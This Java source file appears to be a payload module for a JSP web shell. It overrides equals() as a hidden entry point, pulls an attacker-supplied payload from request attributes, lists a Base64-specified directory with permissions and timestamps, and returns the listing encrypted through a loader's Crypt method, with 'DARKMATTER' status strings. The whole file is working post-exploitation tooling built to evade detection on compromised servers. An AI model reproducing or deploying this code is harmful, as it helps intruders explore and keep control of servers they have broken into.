import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.*;
import java.io.IOException;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.*;

public class file_scandir extends ClassLoader
{
    public file_scandir(ClassLoader objParent) { super(objParent); }
    public file_scandir() { super(file_scandir.class.getClassLoader()); }

    private final DateTimeFormatter DATE_FORMATTER = 
        DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss").withZone(ZoneId.systemDefault());

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored)
        {

        }
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            String szSplitter = mapParams.get("splitter");
            StringBuilder sb = new StringBuilder();
            String z0 = mapParams.get("z0");
            String szPath = new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8);
            
            Path path = Paths.get(szPath).toAbsolutePath().normalize();
            if (!Files.exists(path) || !Files.isDirectory(path))
            {
                sb.append("ERROR://Unable to open directory");
                fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
                return true;
            }

            List<String> lsResult = new ArrayList<>();
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(path))
            {
                for (Path entry : stream)
                {
                    String szFileName = entry.getFileName().toString();
                    boolean bIsDir = Files.isDirectory(entry);
                    szFileName = (bIsDir ? "/" : "") + szFileName;
                    String szb64FileName = Base64.getEncoder().encodeToString(szFileName.getBytes(StandardCharsets.UTF_8));

                    String szPerm = fnGetFilePermission(entry);
                    long nLength = Files.size(entry);

                    BasicFileAttributes attrs = Files.readAttributes(entry, BasicFileAttributes.class);
                    String ctime = DATE_FORMATTER.format(attrs.creationTime().toInstant());
                    String mtime = DATE_FORMATTER.format(attrs.lastModifiedTime().toInstant());
                    String atime = DATE_FORMATTER.format(attrs.lastAccessTime().toInstant());

                    String szResult = String.format("%s?%s?%d?%s?%s?%s", szb64FileName, szPerm, nLength, ctime, mtime, atime);
                    lsResult.add(szResult);
                }
            }

            sb.append(String.join("|", lsResult));

            String szOutput = sb.toString();

            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }

    private String fnGetFilePermission(Path szPath) throws IOException
    {
        StringBuilder sb = new StringBuilder();

        if (Files.isDirectory(szPath))
            sb.append("d");
        else if (Files.isSymbolicLink(szPath))
            sb.append("l");
        else
            sb.append("r");

        try
        {
            PosixFileAttributes attris = Files.readAttributes(szPath, PosixFileAttributes.class);
            Set<PosixFilePermission> perms = attris.permissions();

            // Owner
            sb.append(perms.contains(PosixFilePermission.OWNER_READ) ? 'r' : '-');
            sb.append(perms.contains(PosixFilePermission.OWNER_WRITE) ? 'w' : '-');
            sb.append(perms.contains(PosixFilePermission.OWNER_EXECUTE) ? 'x' : '-');

            // Group
            sb.append(perms.contains(PosixFilePermission.GROUP_READ) ? 'r' : '-');
            sb.append(perms.contains(PosixFilePermission.GROUP_WRITE) ? 'w' : '-');
            sb.append(perms.contains(PosixFilePermission.GROUP_EXECUTE) ? 'x' : '-');

            // Others
            sb.append(perms.contains(PosixFilePermission.OTHERS_READ) ? 'r' : '-');
            sb.append(perms.contains(PosixFilePermission.OTHERS_WRITE) ? 'w' : '-');
            sb.append(perms.contains(PosixFilePermission.OTHERS_EXECUTE) ? 'x' : '-');
        }
        catch (UnsupportedOperationException e)
        {
            sb.append(Files.isReadable(szPath) ? 'r' : '-');
            sb.append(Files.isWritable(szPath) ? 'w' : '-');
            sb.append(Files.isExecutable(szPath) ? 'x' : '-');
            sb.append("------");
        }

        return sb.toString();
    }
}